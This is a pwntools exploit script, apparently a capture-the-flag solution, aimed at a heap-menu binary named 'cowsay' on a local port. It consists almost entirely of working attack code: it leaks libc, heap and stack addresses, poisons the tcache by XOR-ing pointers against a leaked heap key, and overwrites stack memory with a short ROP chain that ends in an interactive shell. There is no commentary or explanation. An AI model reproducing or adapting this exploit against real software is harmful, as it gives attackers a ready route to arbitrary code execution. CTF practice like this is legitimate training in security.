#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template cowsay
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or 'cowsay')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



# def start(argv=[], *a, **kw):
#     '''Start the exploit against the target.'''
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

# io = start()
io = remote("localhost", 1773)

for i in range(10):
    io.sendlineafter(b'> ',b"1")
    io.sendline(str(i).encode())
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ',b'2')
    io.sendline(str(i).encode())
    io.sendline(b'X'*10)

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ',b'2')
io.sendline(b'7')
io.sendline(b'X'*100)
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ',b'2')
io.sendline(b'6')
io.sendline(b'X'*100)
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ',b'2')
io.sendline(b'0')
io.sendline(b'X'*100)
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ',b'2')
io.sendline(b'8')
io.sendline(b'X'*100)

for i in range(9):
    io.sendlineafter(b'> ',b'2')
    io.sendline(str(i).encode())


for i in range(8):
    io.sendlineafter(b'> ',b"4")
    io.sendlineafter(b': ',b'1')
    io.sendline(str(i).encode())

io.sendlineafter(b'> ',b'2')
io.sendline(b'7')
io.recvuntil(b"________")
libc = int(io.recvuntil(b'-')[:-2][::-1][:-1].hex(), 16) - 0x203b20
environ = libc + 0x20ad40

print(hex(libc))
print(hex(environ))

io.sendline(b'2')
io.sendline(b'0')
io.recvuntil(b"_______")
io.recvuntil(b"_______")
a = io.recvuntil(b'-')[:-2][1:]
heap = int(a[0:8][::-1].hex(), 16)
print(hex(heap))



io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ',b'2')
io.sendline(b'6')
io.sendline(p64(environ ^ heap))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ',b'0')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ',b'1')

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ',b'2')
io.sendlineafter(b': ',b'1')
io.sendline(b'A'*23)

io.sendlineafter(b'> ',b'2')
io.sendlineafter(b': ',b'1')

stack = int(io.recvuntil(b'-')[:-2][1:].split(b'\n')[-1][::-1].hex(), 16) - 0x138
print(hex(stack))

io.sendlineafter(b'> ',b'4')
io.sendlineafter(b': ',b'1')
io.sendlineafter(b': ',b'8')

io.sendlineafter(b'> ',b'3')
io.sendlineafter(b': ',b'2')
io.sendlineafter(b': ',b'8')
io.sendline(p64(stack^heap))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ',b'2')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ',b'3')

pop_rbx = 0x00000000000586e4 + libc

io.sendlineafter(b'> ',b'3')
io.sendlineafter(b': ',b'2')
io.sendlineafter(b': ', b'3')
io.sendline(p64(environ) + p64(pop_rbx) + p64(0) + p64(libc+0x583f3))
io.sendlineafter(b"> ",b'0')
io.interactive()

